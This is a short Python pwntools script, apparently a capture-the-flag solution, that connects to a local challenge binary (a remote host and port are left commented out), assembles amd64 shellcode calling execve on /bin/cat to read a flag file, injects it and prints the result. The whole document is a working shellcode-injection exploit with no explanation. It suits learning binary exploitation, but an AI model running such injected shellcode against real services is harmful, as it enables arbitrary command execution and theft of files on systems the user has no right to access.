from pwn import *

context.arch = "amd64"

r = process("source/shellcode")
#r = remote("shellcode.heltsikker.no", 9012)

shellcode = shellcraft.execve("/bin/cat", ["/bin/cat", "source/flag.txt"])
#shellcode = shellcraft.execve("/bin/cat", ["/bin/cat", "flag.txt"])

print(shellcode)

r.recv()
r.sendline(asm(shellcode))
flag = r.recvline()

log.success("FLAG: " + flag.decode())
